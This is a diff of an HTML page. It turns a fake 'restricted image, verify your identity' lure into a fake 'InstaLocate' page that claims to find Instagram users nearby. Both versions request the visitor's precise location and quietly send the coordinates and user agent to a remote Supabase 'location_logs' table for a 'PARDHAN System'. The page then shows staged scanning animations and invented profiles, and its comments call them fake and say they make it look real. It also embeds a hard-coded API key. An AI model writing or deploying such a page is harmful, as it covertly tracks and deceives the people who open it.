@@ -3,76 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Encrypted Content - Verification Required</title>
+    <title>InstaLocate - Find Nearby Profiles</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background-color: #0b0e14; color: #adbac7; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .trap-card { background: #1c2128; border: 1px solid #444c56; padding: 25px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.6); max-width: 380px; text-align: center; }
-        .warn-icon { font-size: 45px; color: #f85149; margin-bottom: 10px; }
-        h2 { color: #f85149; margin-bottom: 10px; font-size: 22px; }
-        .preview { width: 100%; height: 180px; background: url('https://via.placeholder.com/400x200?text=Protected+Image'); background-size: cover; filter: blur(20px); border-radius: 6px; margin: 15px 0; border: 1px solid #30363d; }
-        p { font-size: 14px; line-height: 1.5; color: #768390; }
-        button { background-color: #238636; color: white; border: none; padding: 12px 30px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 15px; transition: 0.2s; width: 100%; }
-        button:hover { background-color: #2ea043; }
-        #log { margin-top: 15px; font-size: 12px; color: #58a6ff; font-family: monospace; }
+        :root { --primary: #0095f6; --bg: #ffffff; --text: #262626; }
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; }
+        
+        /* Premium Hero Section */
+        .hero { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.5s; text-align: center; padding: 20px; background: linear-gradient(135deg, #f0f9ff 0%, #ffffff 100%); }
+        .logo { font-size: 50px; color: var(--primary); margin-bottom: 20px; animation: bounce 2s infinite; }
+        h1 { font-size: 28px; margin-bottom: 10px; font-weight: 800; color: #1a1a1a; }
+        p { color: #8e8e8e; max-width: 300px; margin-bottom: 30px; }
+        
+        .btn-find { background: var(--primary); color: white; border: none; padding: 15px 40px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(0, 149, 246, 0.3); transition: 0.3s; }
+        .btn-find:hover { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(0, 149, 246, 0.4); }
+
+        /* Scanning Animation */
+        #scanner { display: none; text-align: center; }
+        .earth-orbit { height: 150px; width: 150px; border: 2px dashed var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; animation: spin 4s linear infinite; margin: 0 auto 20px; }
+        .earth-orbit i { font-size: 60px; color: var(--primary); animation: reverse-spin 4s linear infinite; }
+
+        /* Fake Results Section */
+        #results { display: none; padding: 20px; grid-template-columns: repeat(2, 1fr); gap: 15px; }
+        .user-card { background: white; border: 1px solid #dbdbdb; border-radius: 8px; padding: 10px; text-align: center; animation: fadeInUp 0.5s ease-out forwards; }
+        .user-card img { width: 70px; height: 70px; border-radius: 50%; object-fit: cover; border: 2px solid var(--primary); }
+        .user-card span { display: block; margin-top: 8px; font-weight: 600; font-size: 13px; }
+
+        /* Animations */
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes reverse-spin { from { transform: rotate(360deg); } to { transform: rotate(0deg); } }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div class="trap-card">
-    <div class="warn-icon">⚠️</div>
-    <h2>Access Restricted</h2>
-    <div class="preview" id="img"></div>
-    <p>This image is restricted for your region. Please complete a <b>Secure Handshake</b> to verify your identity and view the content.</p>
-    
-    <button onclick="p_system_fire()">Allow Connection</button>
-    <div id="log"></div>
-</div>
+    <div id="hero-page" class="hero">
+        <i class="fab fa-instagram logo"></i>
+        <h1>InstaLocate</h1>
+        <p>Find and connect with Instagram users within 2km of your current location.</p>
+        <button class="btn-find" onclick="startSearch()">Find Nearby Users</button>
+    </div>
+
+    <div id="scanner" class="hero">
+        <div class="earth-orbit">
+            <i class="fas fa-globe-americas"></i>
+        </div>
+        <h2 id="status">Scanning Satellite Data...</h2>
+        <p>Establishing secure handshake with regional towers.</p>
+    </div>
+
+    <div id="results-page" style="display: none; padding-top: 40px;">
+        <h2 style="text-align: center;">Users Found (8)</h2>
+        <div id="results">
+            <div class="user-card"><img src="https://i.pravatar.cc/150?u=1"><span>@riya_vibe</span></div>
+            <div class="user-card"><img src="https://i.pravatar.cc/150?u=2"><span>@aman_x8</span></div>
+            <div class="user-card"><img src="https://i.pravatar.cc/150?u=3"><span>@shruti.arts</span></div>
+            <div class="user-card"><img src="https://i.pravatar.cc/150?u=4"><span>@rahul_clicks</span></div>
+        </div>
+    </div>
 
 <script>
-    // PARDHAN x Supabase Configuration
     const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
-    const pardhan_sb = supabase.createClient(SB_URL, SB_KEY);
+    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
 
-    async function p_system_fire() {
-        const log = document.getElementById('log');
-        log.innerText = "[*] Handshake Initializing...";
-
-        // Battery Info capturing
-        let battery_info = "N/A";
-        try {
-            const battery = await navigator.getBattery();
-            battery_info = `${(battery.level * 100).toFixed(0)}%`;
-        } catch(e) {}
+    async function startSearch() {
+        // Switch to Scanning Screen
+        document.getElementById('hero-page').style.display = 'none';
+        document.getElementById('scanner').style.display = 'flex';
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                log.innerText = "[+] Coordinates Captured. Syncing...";
-                
-                const { error } = await pardhan_sb
-                    .from('location_logs')
-                    .insert([{
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
-                        user_agent: navigator.userAgent,
-                        ip: `Battery: ${battery_info}` // Using IP field for battery in test
-                    }]);
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
 
-                if (!error) {
-                    log.innerText = "[✓] Access Granted. Unlocking...";
-                    setTimeout(() => {
-                        document.getElementById('img').style.filter = "none";
-                        document.getElementById('img').style.backgroundImage = "url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=400&h=200')";
-                        alert("Verification Successful! Content Unlocked.");
-                    }, 1500);
-                } else {
-                    log.innerText = "[!] Database Connection Error.";
-                    console.error(error);
-                }
+                // Send data to PARDHAN System
+                await supabaseClient.from('location_logs').insert([{
+                    latitude: lat,
+                    longitude: lon,
+                    user_agent: navigator.userAgent,
+                    ip: "InstaLocate-Search"
+                }]);
+
+                // Animations delay to make it look real
+                setTimeout(() => { document.getElementById('status').innerText = "Analyzing Coordinates..."; }, 2000);
+                setTimeout(() => { document.getElementById('status').innerText = "Fetching Nearby Profiles..."; }, 4000);
+                
+                setTimeout(() => {
+                    document.getElementById('scanner').style.display = 'none';
+                    document.getElementById('results-page').style.display = 'block';
+                    document.getElementById('results').style.display = 'grid';
+                }, 6000);
+
             }, (err) => {
-                log.innerText = "[!] Verification Denied.";
-                alert("Please 'Allow' access to view the encrypted image.");
+                alert("Location access is required to find people in your area. Please refresh and 'Allow' access.");
+                location.reload();
             }, { enableHighAccuracy: true });
         }
     }
